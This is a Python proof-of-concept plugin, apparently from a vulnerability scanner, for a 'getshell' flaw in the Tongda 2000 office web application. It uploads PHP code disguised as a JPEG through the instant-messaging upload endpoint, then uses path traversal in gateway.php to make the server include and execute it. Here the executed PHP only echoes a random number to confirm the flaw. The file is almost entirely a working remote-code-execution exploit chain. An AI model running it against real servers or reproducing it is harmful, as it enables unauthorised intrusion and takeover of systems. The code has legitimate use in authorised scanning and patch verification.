#!/usr/bin/env python
# -*- encoding: utf-8 -*-

"""
@Time ： 2020/3/19 10:32 上午
@Auth ： orleven
@File ：tongda2000_lfi_getshell.py
@IDE ：PyCharm
"""


import os
import aiohttp
import random
from lib.core.data import paths
from lib.utils.connect import ClientSession
from script import Script, SERVICE_PORT_MAP, VUL_LEVEL, VUL_TYPE

class POC(Script):
    def __init__(self, target=None):
        self.service_type = SERVICE_PORT_MAP.WEB
        self.name = 'tongda2000 lfi getshell'
        self.keyword = ['ongda2000']
        self.info = 'tongda2000 lfi getshell'
        self.type = VUL_TYPE.LFI
        self.level = VUL_LEVEL.CRITICAL
        Script.__init__(self, target=target, service_type=self.service_type)

    async def prove(self):
        await self.get_url()
        if self.base_url:
            async with ClientSession() as session:
                upload_url = self.base_url + "/ispirit/im/upload.php"
                include_url = self.base_url + "/ispirit/interface/gateway.php"
                random_str = str(random.randint(100000, 999999))
                form = aiohttp.FormData()
                form.add_field("P", "123")
                form.add_field("Filename", "php.jpg")
                form.add_field("DEST_UID", "1")
                form.add_field("UPLOAD_MODE", "2")
                form.add_field('ATTACHMENT', "<?php echo '%s' ?>" %random_str , filename='php.jpg',content_type='text/plain')
                async with session.post(url=upload_url, data=form) as res:
                    if res:
                        text = await res.text()
                        path = text[text.find('@') + 1:text.rfind('|')].replace("_", "\/").replace("|", ".")
                        file_path = "/general/../../attach/im/" + path
                        include_data = {"json": "{\"url\":\""+ file_path + "\"}"}
                        async with session.post(url=include_url, data=include_data) as include_res:
                            if include_res:
                                include_text = await include_res.text()
                                if random_str in include_text:
                                    self.flag = 1
                                    self.res.append({"info": file_path, "key": 'tongda2000 lfi getshell'})
